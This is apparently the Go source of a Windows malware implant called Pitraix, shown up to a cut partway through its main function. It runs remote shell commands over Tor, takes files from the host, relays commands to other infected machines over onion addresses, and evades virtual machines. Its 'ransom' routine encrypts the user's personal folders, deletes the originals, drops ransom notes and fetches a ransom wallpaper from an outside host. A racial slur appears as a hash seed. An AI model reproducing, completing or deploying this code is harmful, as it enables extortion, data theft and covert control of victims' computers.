/*
	THIS IS EXPERIEMENTAL PAYLOAD TARGETTING WINDOWS

	- 2 RSA key hardcoded differently for encryption and signature
	keys are hardcoded into the code it's self and never change, one is responsible for encryption and other for signature verification

	- Generally after registering with agent, the HST would use his AES key for encrypted communications and not RSA
	
	- Registering goes like this:
	HST generates 256-bit-AES key, encrypts it with hardcoded Agent public-key and sends it to Agent/Operative(camaoflagued as an agent)
	Then HST would only use that AES key for communcations
*/

package main

import (
    "fmt"
	"time"
	"crypto"
	"crypto/tls"
	"crypto/aes"
        "crypto/cipher"
        "crypto/rand"
	"crypto/rsa"
	rdmod "math/rand"
    // "crypto/sha256"
        "crypto/sha512"
	"crypto/x509"
	"encoding/hex"
        "encoding/pem"
        "encoding/base64"
	"encoding/json"
	"unicode"
	"strings"
	"strconv"
	"bytes"
	"os"
	"os/exec"
	// "os/user"
	// "bufio"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"net"
	"archive/zip"
	// "path"
	"path/filepath"
	"syscall"

	"unsafe"
	"golang.org/x/net/proxy"
	"github.com/atotto/clipboard"
	"github.com/TheTitanrain/w32"
)

const (
	osName = 1 // 1 = Windows; 2 = Linux; 3 = Else;
	ddosCounter = 60

	raw_OPEncryptionKeyPEM = `YOUR RSA KEY HERE`

	raw_OPSigningKeyPEM = `YOUR BACKUP RSA KEY HERE`

	agentAddress = "YOUR TOR ONION ADDRESS HERE"
)
var (
	alphaletters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	// moduser32 = syscall.NewLazyDLL("user32.dll")
	user32                  = syscall.NewLazyDLL("user32.dll")
	systemParametersInfo = user32.NewProc("SystemParametersInfoW")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")

	config_FilePath = "Pitraix"
	pitraix_FilePath = "Pitraix"
	tor_FolderPath = "Pitraix"

	tmpFold 	 = os.Getenv("tmp")

	username 	 = os.Getenv("username") // strings.TrimSpace(doInstru("shell", "echo %username%"))
	osArch 		 = strings.Split(strings.TrimSpace(doInstru("shell", "wmic os get osarchitecture")), "\n")[1]
	userHomeDIR  = os.Getenv("USERPROFILE")
	mainDrive    = os.Getenv("HOMEDRIVE")
	shell		 = mainDrive + "\\Windows\\System32\\cmd.exe"

	PrivPaths = []string{
		mainDrive + "\\Windows",
		mainDrive + "\\Windows\\Logs",
		mainDrive + "\\Windows\\security",
		mainDrive + "\\Windows\\System32",
	}

	nonPrivPaths = []string{
		mainDrive + "\\Users\\" + username + "\\AppData\\Local",
		mainDrive + "\\Users\\" + username + "\\AppData\\Roaming",
		mainDrive + "\\Users\\" + username + "\\AppData\\Roaming\\Microsoft",
		mainDrive + "\\Users\\" + username + "\\AppData\\LocalLow",
	}

	torProxyUrl, _ = url.Parse("SOCKS5H://127.0.0.1:9050")

	tbDialer, _ = proxy.FromURL(torProxyUrl, proxy.Direct)

	contactDate string
	firstTime bool
	
	locAES_Key []byte
	AES_Key []byte
	
	cft config_File_Type
	confAsyncChn = make(chan []string)

	certError_Count int
	currentPath, _ = os.Executable()
)

type config_File_Type struct {
	Events   map[string][]string
	Logs 	 map[string][]string
	Modules	 map[string][]string
	RegTmp   []string
	RoutesH  []string
	Register bool
	AES_Key  string
	ContactD string
}

// type instruType struct {
// 	INSTS []string
// }

type ipInfo struct {
	IP 		 string
	Hostname string
	City 	 string
	Region 	 string
	Country  string
	Org 	 string
	Timezone string
}

func setwallpaperFile(filename string) error {
	filenameUTF16, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return err
	}

	systemParametersInfo.Call(
		uintptr(0x0014),
		uintptr(0x0000),
		uintptr(unsafe.Pointer(filenameUTF16)),
		uintptr(0x01|0x02),
	)
	return nil
}

func pemDec(key string) *pem.Block {
	temp_pem_decode, _ := pem.Decode([]byte(key))
	return temp_pem_decode
}

func readFile(filePath string) ([]byte, error){
	file, err := os.Open(filePath)
	if err != nil {
		// fmt.Println("Reading file error:", filePath, err)
		return []byte{}, err
	}
	defer file.Close()

	fs, _ := file.Stat()
	// fmt.Println("File size:", fs.Size())
	b := make([]byte, fs.Size())

	for {
		_, err := file.Read(b)
		if err != nil {
			if err != io.EOF {
				// fmt.Println("real weird happened while reading file", filePath, err)
				return []byte{}, err
			}
			break
		}
	}

	// fmt.Println(string(b))

	return b, nil
}


func isASCII(s string) bool {
    for _, c := range s {
        if c > unicode.MaxASCII {
            return false
        }
    }
    return true
}

func allZero(s []byte) bool {
    for _, v := range s {
        if v != 0 {
            return false
        }
    }
    return true
}

func createConfFile(problem string) {
	// AES_Key = random_Bytes(32, true)
	cft.AES_Key = base64.StdEncoding.EncodeToString(AES_Key)
	cft.ContactD = contactDate
	cft.Logs = map[string][]string{"1": {"firstTime", "There was error with config file and had to fix: " + problem, contactDate}}
	cft.Events = map[string][]string{"1": {"firstTime", "Opened implant", contactDate}}
	cft.Modules = map[string][]string{"0": {}}
	cft.RegTmp  = []string{}
	cft.RoutesH = []string{}
	cft.Register = false
	
	out, _ := json.Marshal(cft)
	pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
	f, _ := os.Create(config_FilePath)
	f.WriteString(base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
	f.Close()
}

func confUpdaterAsync() {
	for nc := range confAsyncChn {
		cft.updateConf(nc[0], nc[1:])
		// data_splitted := strings.Split(data, "|")
		// cft.updateConf(data_splitted[0], strings.Split(data[len(data_splitted[0]) + 1:], "|"), locAES_Key)
	}
}

func (cft *config_File_Type) updateConf(ind string, val []string) {
	// fmt.Println(ind, val, locAES_Key)
	fc, err := readFile(config_FilePath)
	if err != nil {
		fmt.Println("no conf file: ", config_FilePath, err)
		AES_Key = random_Bytes(32, true)
		createConfFile("conf file not exist")
		cft.updateConf(ind, val)
		fmt.Println("fixed")
		firstTime = true
	} else {
		fc_splitted := strings.Split(string(fc), "|")
		if len(fc_splitted) != 2 {
			AES_Key = random_Bytes(32, true)
			createConfFile("conf file tampered not len 2")
			cft.updateConf(ind, val)
			fmt.Println("fixed")
			firstTime = true
			// os.Remove(config_FilePath)
		} else {
			fc_deciphered, err := base64.StdEncoding.DecodeString(fc_splitted[0])
			if err != nil {
				AES_Key = random_Bytes(32, true)
				createConfFile("conf file base64 1 tampered")
				cft.updateConf(ind, val)
				fmt.Println("fixed")
				firstTime = true
				// os.Remove(config_FilePath)
			} else {
				fc_nonce, err := base64.StdEncoding.DecodeString(fc_splitted[1])
				if err != nil {
					AES_Key = random_Bytes(32, true)
					createConfFile("conf file base64 2 tampered")
					cft.updateConf(ind, val)
					fmt.Println("fixed")
					firstTime = true
					// os.Remove(config_FilePath)
				} else {
					if len(fc_nonce) != 12 {
						fmt.Println("Invalid nonce length", len(fc_nonce), fc_nonce)
						AES_Key = random_Bytes(32, true)
						createConfFile("conf file invalid nonce length")
						cft.updateConf(ind, val)
						fmt.Println("fixed")
						firstTime = true
						// os.Remove(config_FilePath)
					} else {
						decrypted_fc, err := decrypt_AES(fc_deciphered, fc_nonce, locAES_Key)
						if err != nil {
							AES_Key = random_Bytes(32, true)
							createConfFile("conf file decryption error")
							cft.updateConf(ind, val)
							fmt.Println("fixed")
							firstTime = true
							// os.Remove(config_FilePath)
						} else {
							// fmt.Println(string(decrypted_fc))
							err = json.Unmarshal(decrypted_fc, &cft)
							if err != nil {
								AES_Key = random_Bytes(32, true)
								createConfFile("conf file unmarshal error tampered")
								cft.updateConf(ind, val)
								fmt.Println("fixed")
								firstTime = true
								// os.Remove(config_FilePath)
							} else {
								// cft.AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)
								if ind == "aes" {
									cft.AES_Key = val[0]
								} else if ind == "contactd" {
									cft.ContactD = val[0]
								} else if ind == "register" {
									fmt.Println("got register")
									if val[0] == "true" {
										fmt.Println("set register to true")
										cft.Register = true
									} else {
										cft.Register = false 
									}
								} else if ind == "logs" {
									cft.Logs[strconv.Itoa(len(cft.Logs) + 1)] = []string{val[0], val[1], val[2]}

								} else if ind == "clearlogs" {
									cft.Logs = map[string][]string{"1": {"clear", "cleared logs upon request", contactDate}}

								} else if ind == "events" {
									// fmt.Println("current len is:", len(cft.Events))
									cft.Events[strconv.Itoa(len(cft.Events) + 1)] = []string{val[0], val[1], val[2]}
									// fmt.Println(len(cft.Events), "done", ind, val)
									// fmt.Println(cft.Events)

								} else if ind == "modules" {
									cft.Modules[strconv.Itoa(len(cft.Modules) + 1)] = []string{val[0], val[1], val[2]}
									
								} else if ind == "regtmp" {
									cft.RegTmp = append(cft.RegTmp, val[0])

								} else if ind == "clearregtmp" {
									cft.RegTmp = []string{}

								} else if ind == "routesh" {
									cft.RoutesH = append(cft.RoutesH, val[0])

								} else if ind == "clearroutesh" {
									cft.RoutesH = []string{}

								} else if ind == "fetch" {
								} else {
									fmt.Println("Invalid index!", ind, val)
								}
								// fmt.Println(cft, ind, val)
								
								AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)

								if ind != "fetch" {
									// fmt.Println("config file unmrashalled:", cft)
									f, err := os.Create(config_FilePath)
									if err != nil {
										fmt.Println("Error writing conf file!!!", config_FilePath, err)
										// os.Remove(config_FilePath)
									} 
									out, _ := json.Marshal(cft)
									pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
									pl_encoded := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(pl_encrypted), base64.StdEncoding.EncodeToString(pl_nonce))
									f.WriteString(pl_encoded)

									fmt.Println("updated conf file")	
								} else {
									fmt.Println("updated cft but not conf file")
								}
							}
						}
					}
				}
			}
		}
	}
}

func isadmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func bytesumbig(v []byte) int {
	sum := 0
	for i, v := range v {
		// fmt.Println(sum)
		sum += int(v) + i * sum
	}
	// fmt.Println(sum)
	return sum
}

func predictable_random(iv string, size int, t bool) (string, int) {
	// var chosenValue string
	var sumForSeed = bytesumbig([]byte(iv))

	rdmod.Seed(int64(sumForSeed + size + len(iv)))

	if size == 0 {
		size = rdmod.Intn(len(iv)-1) + 1
	}
	
	x := fmt.Sprintf("%x", sha512.Sum512([]byte("nigger")))
	sumForSeed = bytesumbig([]byte(x))
	rdmod.Seed(int64(sumForSeed + size + len(x)))
	// fmt.Println(iv, size, x)
	
	if t == true {
		s := make([]rune, size)
		for i := range s {
			s[i] = alphaletters[rdmod.Intn(len(alphaletters))]
		}
		return string(s), 0
	} else {
		var s string = ""
		for i := 0; i < size; i++ {
			rdmod.Seed(int64(i + size + len(iv) * sumForSeed))
			s += fmt.Sprintf("%d", rdmod.Intn(9) + 1)
			// fmt.Println(i, size, len(iv), sumForSeed, s)
		}

		i,_ := strconv.Atoi(s)
		return "", i
	}
}

func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) string {
	// bypassCountries := []string{
	// 	"CN", // China
	// 	"IR", // Iran
	// 	"EG", // Egypt
	// 	"IQ", // Iraq
	// 	"PK", // Pakistan
	// 	"RU", // Russia
	// }
	// linux implementation
	// if !file_Exists(path + "\\" + name) || forceSetup == true { // download + unzip + extract tor only		
	if !file_Exists(filepath.Join(path, name)) || forceSetup == true {
		// if inFindStr(ipinfo_struct.Country, bypassCountries) {
		fmt.Println("Tor not found!", !file_Exists(filepath.Join(path, name)), forceSetup)
		
		var v1m, v2m, v3m int = 11, 4,  0
		var found bool = false
		for {
			tor, err := getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/", v1m ,v2m, v3m), false, 10)
			if err != nil {
				certError_Count += 1
				if certError_Count == 5 {
					http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
					fmt.Println("####### IMPORTANT ####### InsecureSkipVerify: true")
				}
				fmt.Println(err)
				time.Sleep(time.Second * 5)
				continue
			}
			if len(tor) < 300 {
				fmt.Println("Not found", v1m, v2m, v3m)
				if v3m == 20 {
					v3m = 0
					v2m += 1
				} else {
					v3m += 1
				}

				if v2m == 20 {
					v2m = 0
					v1m += 1
				}

				// if v1m == 20 {
				// 	v1m +=
				// }
				if found == false {
					continue
				}
			}
			if found == false {
				fmt.Println("Found, doing found check..")
				found = true
			} else {
				var downloadType string
				if osArch == "AMD64" || osArch == "64-bit" {
					downloadType = "64"
				} else if osArch == "x86" || osArch == "32-bit" {
					downloadType = "32"
				} else {
					fmt.Println("WTF?", osArch)
				}
				x := fmt.Sprintf(`<a href="tor-win%s`, downloadType)
				y := strings.Index(string(tor), x)
				z := strings.TrimSpace(string(tor)[y + 5:y + 70])
				
				st := strings.Index(z, ">") + 1
				ed := strings.Index(z, "<")
				fnl := strings.TrimSpace(z[st:ed])
				// fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/%s", v1m, v2m, v3m, fnl)

				tor, err = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/%s", v1m, v2m, v3m, fnl), false, -1)
				// fmt.Println(tor, err)

				// fmt.Println("Found check, no gay tor duplicate, Starting download..")
				// fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/tor-win64-0.4.7.8.zip", v1m, v2m, v3m,)

				// // tor, err = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/tor-browser-linux64-%d.%d.%d_en-US.tar.xz", v1m ,v2m, v3m, v1m, v2m, v3m), false, -1)
				
				fmt.Println(err)
				f, err := os.Create(filepath.Join(path, name + ".zip")) // path + "\\" + name + ".zip")
				f.Write(tor)
				fmt.Println(err, path, name)
				f.Close()
				break
			}

		}
		// unzip(path + "\\" + name + ".zip", path + "\\" + name)
		unzip(filepath.Join(path, name + ".zip"), filepath.Join(path, name))

		// os.Remove(path + "\\" + name + ".zip")
		os.Remove(filepath.Join(path, name + ".zip"))

		torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc")) // os.Create(path + "\\" + name + "\\" + name + "torc")
		defer torrcf.Close()
		torrcf.Write([]byte(fmt.Sprintf(`HiddenServiceDir %s
HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), port))) // path + "\\" + name + "\\" + name + "hid", port)))

	}
	
	// os.Setenv("LD_LIBRARY_PATH",  path + "/" + name) // needed for latest linux
	

	doInstru("shellnoop", filepath.Join(path, name, "Tor", "tor.exe") + " -f " + filepath.Join(path, name, name + "torrc")) // path + "\\" + name + "\\Tor\\tor.exe -f " + path + "\\" + name + "\\" + name + "torc")
	time.Sleep(time.Second * 5) // ensures we have enough time to connect

	hostnamef, err := readFile(filepath.Join(path, name, name + "hid", "hostname")) // path + "\\" + name + "\\" + name + "hid\\hostname")
	rhostname := strings.Split(string(hostnamef), ".")[0]
	if err != nil {
		fmt.Println("hostname read error:", err)
		// doInstru("shell", "rm -rf " + path + "\\" + name)
		rhostname = setupTor(path, port, name, ipinfo_struct, true)
	}

	return rhostname
}

func doInstru(ic, iv string) string {
	// fmt.Println("doInstru", ic, iv)
	var out string 
	switch (ic) {
	case "shell": // shell instruction with output (locking)
		cmd := exec.Command(shell, "/c", iv)
		var outbuffer bytes.Buffer

		cmd.Stderr = &outbuffer
		cmd.Stdout = &outbuffer
		cmd.Run()
		
		out = outbuffer.String()

	case "shellnoop": // shell instruction without output (non locking)
		cmd := exec.Command(shell, "/c", iv)
		cmd.Start()
	
	case "cuexe":
		out = currentPath

	case "cufol":
		fmt.Println(currentPath, filepath.Dir(currentPath))
		out = filepath.Dir(currentPath)

	case "snatchregs": // snatches registered hosts from agent
		if len(cft.RegTmp) > 0 {
			outb, _ := json.Marshal(cft.RegTmp)
			confAsyncChn <- []string{"clearregtmp", "1"} // SAFE clears hosts to save space
			// cft.RegTmp = []string{} // UNSAFE clears hosts to save space
			out = string(outb)
		} else {
			out = "No registers to snatch"
		}

	case "snatchlogs": // snatches registered hosts from agent
		if len(cft.Logs) > 0 {
			outb, _ := json.Marshal(cft.Logs)
			// confAsyncChn <- []string{"clearlogs", "1"} // SAFE clears hosts to save space
			out = string(outb)
		} else {
			out = "No logs to snatch"
		}
	
	case "snatchevents": // snatches registered hosts from agent
		if len(cft.Events) > 0 {
			outb, _ := json.Marshal(cft.Events)
			// confAsyncChn <- []string{"clearlogs", "1"} // SAFE clears hosts to save space
			out = string(outb)
		} else {
			out = "No events to snatch"
		}

	case "assign":
		confAsyncChn <- []string{"routesh", iv}

	case "relay":
		fmt.Println("############ GOT RELAY")
		ivspl := strings.Split(iv, " ")
		if ivspl[0] == "*" { // relay to all routes hosts
			for _, v := range cft.RoutesH {
				fmt.Println("V:", v)
				response, err := postRequest("http://" + v + ".onion", []byte(iv[2:]), true, 25)
				fmt.Println(string(response), err)
				out += string(response) + "\n"
			}
		} else { // targeted relay
			fmt.Println("TARGETED RELAY DETECTED: PAYLOAD: ", ivspl[1], "TO " + ivspl[0])
			go func(ivspl []string) {
				response, err := postRequest("http://" + ivspl[0] + ".onion", []byte(ivspl[1]), true, 25)
				fmt.Println(string(response), err)
				// out += string(response) + "\n"
			}(ivspl)
		}
		out = strings.TrimSpace(out)

	case "ransom":
		ivspl := strings.Split(iv, " ")
		if len(ivspl) != 4 {
			fmt.Println("error ransom split:", ivspl)
			out = "Error: len not 4"
		} else {
			key, err := base64.StdEncoding.DecodeString(ivspl[3])
			if err != nil {
				fmt.Println("error ransom key:", err)
				out = "Error:" + err.Error()
			} else {
				text := fmt.Sprintf("All your files have been encrypted. Do not bother searching online. Only people on earth that can decrypt your files are us.\nTo start decryption process, send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
				fmt.Println("RANSOOOM", iv, key, text)

				target_paths := []string{
					mainDrive + "\\" + "Users\\" + username + "\\Desktop",
					mainDrive + "\\" + "Users\\" + username + "\\Documents",
					mainDrive + "\\" + "Users\\" + username + "\\Downloads",
					mainDrive + "\\" + "Users\\" + username + "\\Pictures",
					mainDrive + "\\" + "Users\\" + username + "\\Videos",
					mainDrive + "\\" + "Users\\" + username + "\\Music",
				}
				for _, path := range target_paths {
					go encFiles(path, key)
				}
				
				time.Sleep(2 * time.Second)

				for i := 0; i < 69; i++ {
					f, _ := os.Create(target_paths[0] + fmt.Sprintf("\\READ_ME_%d.txt", i + 1))
					f.WriteString(text)
					f.Close()
				}

				go func() {
					wallpaper, err := getRequest("https://i.ibb.co/PF66SBN/ransomwallpaper.png", false, -1)
					fmt.Println(err, nonPrivPaths[1])
					if err == nil {
						f, err := os.Create(nonPrivPaths[1] + "\\oof.png")
						fmt.Println(err)
						if err == nil {
							f.Write(wallpaper)
							f.Close()
							setwallpaperFile(nonPrivPaths[1] + "\\oof.png")
						}
					}
				}()

				go func() {
					for i := 0; i < 15; i++ {
						beepSound(2000, 5000)
						time.Sleep(3 * time.Second)
				
					}
				}()

				go func(coin string) {
					time.Sleep(5 * time.Second)
					doInstru("shell", "notepad " + mainDrive + "\\" + "Users\\" + username + "\\Desktop\\READ_ME_25.txt")
					time.Sleep(480)
					doInstru("shell", "start chrome \"https://www.google.com/search?q=How to buy " + coin + "\"")

				}(ivspl[1])

				out = "Done"
			}
		}

	case "decrypt":
		key, err := base64.StdEncoding.DecodeString(iv)
		if err != nil {
			fmt.Println("error ransom key:", err)
			out = "Error:" + err.Error()
		} else {
			target_paths := []string{
				mainDrive + "\\" + "Users\\" + username + "\\Desktop",
				mainDrive + "\\" + "Users\\" + username + "\\Documents",
				mainDrive + "\\" + "Users\\" + username + "\\Downloads",
				mainDrive + "\\" + "Users\\" + username + "\\Pictures",
				mainDrive + "\\" + "Users\\" + username + "\\Videos",
				mainDrive + "\\" + "Users\\" + username + "\\Music",
			}
			for _, path := range target_paths {
				go decFiles(path, key)
			}

			out = "Done"
		}

	case "wallpaper":
		if file_Exists(iv) {
			setwallpaperFile(iv)
			out = "Done"
		} else {
			out = "File does not Exist"
		}
	
	case "download":
		if file_Exists(iv) {
			f, err := readFile(iv)
			if err == nil {
				out = base64.StdEncoding.EncodeToString(f)
			} else {
				out = "Error:" + err.Error()
			}
		} else {
			out = "Error: File does not Exist"
		}

	case "upload":
		ivspl := strings.Split(iv, " ")
		if len(ivspl) == 2 {
			fileBase64 := strings.TrimSpace(ivspl[1]) // iv[len(ivspl[0]) + 1:])

			content, err := base64.StdEncoding.DecodeString(fileBase64)
			if err == nil {
				f, _ := os.Create(filepath.Join(tmpFold, ivspl[0]))
				f.Write(content)
				f.Close()
				out = "Done"
			} else {
				out = "Error:" + err.Error()
			}
		} else {
			out = "Error: len not 2"
		}
	
	case "unzip":
		extn := strings.Split(iv, ".")
		if len(extn) > 1 {
			err := unzip(filepath.Join(iv), filepath.Join(extn[0]))
			if err == nil {
				out = "Done"
			} else {
				out = "Error: Couldn't unzip:" + err.Error()
			}
		} else {
			out = "Error: Invalid path " + iv
		}

	case "beep":
		ivspl := strings.Split(iv, " ")
		if len(ivspl) == 2 {
			freq, _ := strconv.Atoi(ivspl[0])
			dur, _ := strconv.Atoi(ivspl[1])

			err := beepSound(freq, dur)
			if err !=  nil{
				out = "Error: " + err.Error()
			} else {
				out = "Done"
			}
		} else {
			out = "Error: Invalid instruction format: " + iv
		}

	case "noop":
		fmt.Println("Pitraix")
	}

	fmt.Println("out:", out)
	return out
}

func beepSound(freq, dur int) error {
	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
	beep32, _ := syscall.GetProcAddress(kernel32, "Beep")
	defer syscall.FreeLibrary(kernel32)

	_, _, e := syscall.Syscall(uintptr(beep32), uintptr(2), uintptr(freq), uintptr(dur), 0)
	if e != 0 {
		return e
	}
	return nil
}

func decFiles(path string, key []byte) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		fmt.Println("err 1", err)
		// continue
	}
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".ini") || strings.HasSuffix(file.Name(), ".lnk") {
			continue
		}
		if file.IsDir() {
			encFiles(path + "\\" + file.Name(), key)
			continue
		}
		fname := file.Name()
		if (path == mainDrive + "\\" + "Users\\" + username + "\\Desktop") && strings.HasPrefix(fname, "READ_ME_") && fname != "READ_ME_" {
			os.Remove(path + "\\" + fname)
			continue
		}
		f, err := readFile(path + "\\" + fname)
		if err != nil {
			fmt.Println("err 2", err)
			continue
		}
		oof := strings.Split(fname, "_")
		// fmt.Println("oooooooof", oof)
		if len(oof) > 1 {
			// fmt.Println("oof", strings.Replace(oof[1], filepath.Ext(oof[1]), "", -1))
			nonce, err := hex.DecodeString(strings.Replace(oof[1], filepath.Ext(oof[1]), "", -1))
			if err != nil {
				fmt.Println("oof nonce error", err)
				continue
			}
			decypher, err := decrypt_AES(f, nonce , key)
			if err != nil {
				fmt.Println("oof dec error", err)
				continue
			}
			os.Remove(path + "\\" + fname)
			out, err := os.Create(path + "\\" + oof[0]) // + filepath.Ext(fname))
			out.Write(decypher)
			if err != nil {
				fmt.Println("err 3", err)
				continue
			}
			out.Close()	
		}
	}
}

func encFiles(path string, key []byte) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		fmt.Println("err 1", err)
		// continue
	}
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".ini") || strings.HasSuffix(file.Name(), ".lnk") {
			continue
		}
		if file.IsDir() {
			encFiles(path + "\\" + file.Name(), key)
			continue
		}
		fname := file.Name()
		f, err := readFile(path + "\\" + fname)
		if err != nil {
			fmt.Println("err 2", err)
			continue
		}
		os.Remove(path + "\\" + fname)
		// f = append([]byte(fname + "|"))
		cypher, nonce, _ := encrypt_AES(f, key)

		out, err := os.Create(path + "\\" + fname + "_" + hex.EncodeToString(nonce) + filepath.Ext(fname))
		out.Write(cypher)
		if err != nil {
			fmt.Println("err 3", err)
			continue
		}
		out.Close()	
	}
}

func unzip(src, dest string) error {
    r, err := zip.OpenReader(src)
    if err != nil {
        return err
    }
    defer func() {
        if err := r.Close(); err != nil {
            // panic(err)
			log("unzip", "error while unzipping: " + err.Error())
			fmt.Println(err)
        }
    }()

    os.MkdirAll(dest, 0755)

    extractAndWriteFile := func(f *zip.File) error {
        rc, err := f.Open()
        if err != nil {
            return err
        }
        defer func() {
            if err := rc.Close(); err != nil {
				log("unzip", "error while extracting: " + err.Error())
                fmt.Println(err)
            }
        }()

        path := filepath.Join(dest, f.Name)

        // // // Check for ZipSlip (Directory traversal)
        // // if !strings.HasPrefix(path, filepath.Clean(dest) + string(os.PathSeparator)) {
        // //     return fmt.Errorf("illegal file path: %s", path)
        // // }

        if f.FileInfo().IsDir() {
            os.MkdirAll(path, f.Mode())
        } else {
            os.MkdirAll(filepath.Dir(path), f.Mode())
            f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
            if err != nil {
                return err
            }
            defer func() {
                if err := f.Close(); err != nil {
                    fmt.Println(err)
                }
            }()

            _, err = io.Copy(f, rc)
            if err != nil {
                return err
            }
        }
        return nil
    }

    for _, f := range r.File {
        err := extractAndWriteFile(f)
        if err != nil {
            return err
        }
    }

    return nil
}

func getMachineInfo() (string, int, string, string, int, string, string, string){
	var (
		hostname	   string
		machineType    int
		osVariant      string
 		kernelVersion  string
		arch 		   int
		machineVendor  string
		machineModel   string
		memory		   string
	)
	
	procArch := strings.TrimSpace(doInstru("shell", "echo %PROCESSOR_ARCHITECTURE%"))
	if procArch == "AMD64" || procArch == "64-bit" {
		arch = 0
	} else if procArch == "x86" || procArch == "34-bit" {
		arch = 1
	} else {
		arch = 2
	}

	// osVariant = "windows 10 test"
	osVariant = strings.TrimSpace(doInstru("shell", "ver"))
	kernelVersion = osVariant[19:len(osVariant) - 1]
	//osVariant = strings.TrimSpace(osVariant[8:])
	// fmt.Println("F YOU!", osVariant, kernelVersion)
	
	VendorInfo := strings.TrimSpace(doInstru("shell", "wmic computersystem get manufacturer, model,name"))
	VendorInfoField := strings.Fields(VendorInfo)
	machineModel = VendorInfoField[len(VendorInfoField) - 2]
	hostname = VendorInfoField[len(VendorInfoField) - 1]

	VendorSplitted := strings.Split(VendorInfo, "\n")
	machineVendor = strings.TrimSpace(VendorInfo[len(VendorSplitted[0]) + 1: len(VendorInfo) - (len(machineModel) + len(hostname) + 2)])

	if strings.Contains(hostname, "DESKTOP") || strings.Contains(hostname, "PC") {
		machineType = 0
	} else {
		machineType = 1
	}

	meminfo_Raw := strings.Fields(strings.TrimSpace(doInstru("shell", "wmic computersystem get totalphysicalmemory")))
	memory = meminfo_Raw[1]



	//fmt.Println(VendorInfo, "ok", machineVendor, machineModel, hostname, "end")
	// "wmic computersystem get model,name,manufacturer,systemtype"
	return hostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel, memory
}


func vmCheck(userHostname, cpuVendor, machineVendor, machineModel string) {
	vm := false
	var vmCPU = map[string]bool{
		"bhyve bhyve ": true,
		" KVMKVMKVM  ": true,
		"TCGTCGTCGTCG": true,
		"Microsoft Hv": true,
		" lrpepyh  vr": true,
		"VMwareVMware": true,
		"XenVMMXenVMM": true,
		"ACRNACRNACRN": true,
		" QNXQVMBSQG ": true, // effect embedded systems 

	}
	if vmCPU[cpuVendor] {
		vm = true
	}

	if machineVendor == "innotek GmbH" || machineModel == "VirtualBox" {
		vm = true
	}

	if vm == true {
		fmt.Println("VM!")
		os.Exit(0)
	}
}

func log(logContext, logInfo string) {
	logTimestamp := time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// logTimestamp = logTimestamp[2:strings.Index(logTimestamp, ".")]
	// logTimestamp = strings.Replace(logTimestamp, " ", "", -1)
	// logTimestamp = strings.Replace(logTimestamp, ":", "", -1)

	// fmt.Println(fmt.Sprintf("logs|%s|%s|%s", logContext, logInfo, logTimestamp))
	confAsyncChn <- []string{"logs", logContext, logInfo, logTimestamp}
	// fmt.Sprintf("logs|%s|%s|%s", logContext, logInfo, logTimestamp)
}

func event(eventContext, eventInfo string) {
	eventTimestamp := time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// eventTimestamp = eventTimestamp[2:strings.Index(eventTimestamp, ".")]
	// eventTimestamp = strings.Replace(eventTimestamp, " ", "", -1)
	// eventTimestamp = strings.Replace(eventTimestamp, ":", "", -1)
	confAsyncChn <- []string{"events", eventContext, eventInfo, eventTimestamp}
}

func copyf(src, dst string) error {
    in, err := os.Open(src)
    if err != nil {
        return err
    }
    defer in.Close()

    out, err := os.Create(dst)
    if err != nil {
        return err
    }
    defer out.Close()

    _, err = io.Copy(out, in)
    if err != nil {
        return err
    }

	// out.Sync()
    return out.Close()
}

func main() {
	contactDate = time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
	// contactDate = contactDate[2:strings.Index(contactDate, ".")]
	// contactDate = strings.Replace(contactDate, " ", "", -1)
	// contactDate = strings.Replace(contactDate, ":", "", -1)
	
	cpuinfo_raw := strings.TrimSpace(doInstru("shell", "wmic CPU get name, manufacturer")[18:]) // "Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz" // cpuInfo_Split[1] // fix
	cpuinfo_split := strings.Fields(cpuinfo_raw)
	cpu := strings.TrimSpace(cpuinfo_raw[len(cpuinfo_split[0]):])
	cpuVendor := cpuinfo_split[0] //cpuInfo_Split[2] // fix
	fmt.Println("cpuVendor:", cpuVendor)

	userHostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel, memory := getMachineInfo()
	fmt.Println(userHostname, osVariant, kernelVersion, arch, machineVendor, machineModel)

	/*
		####################################### DEBUGGING RE-ENABLE AT RELEASE!!! ############################################
	*/
	vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
	

	if tor_running_check() { // exits if already running
		os.Exit(0)
	}
	
	pitraix_FilePath, _ = predictable_random(cpu + cpuVendor + userHomeDIR + "zfPILTORACIXO!2" + username, 0, true)
